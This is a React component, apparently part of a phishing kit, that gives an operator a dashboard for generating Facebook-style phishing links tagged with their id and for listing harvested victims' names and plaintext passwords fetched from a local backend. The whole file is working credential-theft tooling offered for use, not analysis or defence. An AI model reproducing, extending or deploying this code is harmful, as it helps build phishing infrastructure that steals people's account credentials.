import React, { useEffect, useState } from "react";
import PhishData from './PhishData'
const HackedDetail = ({keyValue}) => {
  const [link, setLink] = useState("");
  const [userKey, setUserKey] = useState("");
  const [phishData, setPhishData] = useState([]);
  
  useEffect(() => {
    fetch("http://localhost:5000/userList", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ key: keyValue}),
    })
      .then((response) => response.json())
      .then((result) => {
        setUserKey(result);
      });
  },[keyValue]);


  const handelLink = (id) => {
    const finalLink = `http://localhost:3000/facebook?id=${id}`;
    setLink(finalLink);
  };

  useEffect(() => {
    fetch('http://localhost:5000/phishedData',{
        method:'POST',
        headers: {
            'Content-Type':'application/json'
        },
        body: JSON.stringify({ key: keyValue})
    })
    .then(response => response.json())
    .then(data => {
        setPhishData(data);
    })
  },[keyValue])


  return (
    <div className="text-center mt-5">
      <h2>Phish Link List</h2>
      <button onClick={() => handelLink(userKey[0].key)} className="btn btn-danger">
        Generate
      </button>

      <p className="my-2">
        <a href={link}>
          <span>{link}</span>
        </a>
      </p>

    <h3 className="my-3"><span>My Phish Data : <span className="name">{phishData.length}</span></span></h3>

    <table className="table table-dark">
        <thead>
            <tr>
                <th>*</th>
                <th>Name</th>
                <th>Password</th>
            </tr>
        </thead>
        <tbody>
            {
                phishData.map((phish,index) => <PhishData key={phish._id} index={index} phish={phish}></PhishData>)
            }
        </tbody>
    </table>

    </div>
  );
};

export default HackedDetail;
